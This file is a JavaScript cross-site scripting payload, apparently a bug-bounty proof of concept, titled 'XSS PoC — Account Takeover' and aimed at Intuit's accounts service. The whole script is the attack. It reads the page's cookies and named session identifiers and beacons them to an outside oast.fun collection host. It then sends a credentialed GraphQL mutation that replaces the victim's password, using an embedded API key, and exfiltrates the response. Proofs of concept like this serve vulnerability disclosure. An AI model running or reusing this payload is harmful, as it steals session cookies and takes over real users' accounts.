(async function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var log=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

function uid(){
return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)
})
}

var cookies=document.cookie;
var sid=gc('ius_session');
var aid=gc('qbn.authid')||gc('0.authid')||gc('qbn.parentid');
var vid=gc('ivid');
var origin=location.origin;
var href=location.href;

log.push('origin: '+origin);
log.push('href: '+href.substring(0,80));
log.push('cookies length: '+cookies.length);
log.push('ius_session: '+(sid||'EMPTY'));
log.push('authid: '+(aid||'EMPTY'));
log.push('ivid: '+(vid||'EMPTY'));

(new Image).src=O+'/xss-cookies?c='+encodeURIComponent(cookies);

try{
var url='https://accounts.intuit.com/identity-api/v2/graphql';
var hdrs={
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_flowid':uid(),
'intuit_tid':uid()
};
if(sid){
hdrs['intuit_sessionid']=sid;
hdrs['intuit_profilingid']=sid;
}
if(aid) hdrs['intuit_routingid']=aid;
if(vid) hdrs['intuit_visitorid']=vid;

log.push('fetch URL: '+url);
log.push('headers: '+JSON.stringify(Object.keys(hdrs)));

var r=await fetch(url,{
method:'POST',
credentials:'include',
headers:hdrs,
body:JSON.stringify({
query:'mutation ReplacePassword($input:Identity_CreateOrReplacePasswordCredentialInput!){identityCreateOrReplacePasswordCredential(input:$input){__typename ...on Identity_CreateOrReplacePasswordCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
variables:{input:{newPassword:'Poc@2027'}},
operationName:'ReplacePassword'
})
});

log.push('status: '+r.status+' '+r.statusText);
log.push('resp headers: '+JSON.stringify([...r.headers.entries()]));

var txt=await r.text();
log.push('body: '+txt);

(new Image).src=O+'/xss-result?s='+r.status+'&b='+encodeURIComponent(txt.substring(0,500));

document.body.innerHTML='<div style="font:14px monospace;background:#111;color:#0f0;padding:20px;min-height:100vh;word-break:break-all">'
+'<h1 style="color:red">XSS PoC — Account Takeover</h1>'
+'<h2 style="color:orange">Debug Log</h2>'
+'<pre style="color:#0f0;white-space:pre-wrap">'+log.join('\n')+'</pre>'
+'<h2 style="color:orange">API Response</h2>'
+'<pre style="color:yellow;white-space:pre-wrap">'+txt+'</pre>'
+'</div>'

}catch(e){
log.push('ERROR: '+e.message);
log.push('stack: '+e.stack);
(new Image).src=O+'/xss-error?e='+encodeURIComponent(e.message);
document.body.innerHTML='<div style="font:14px monospace;background:#111;color:red;padding:20px;min-height:100vh;word-break:break-all">'
+'<h1>XSS PoC — Error</h1>'
+'<pre style="white-space:pre-wrap">'+log.join('\n')+'</pre>'
+'</div>'
}
})();
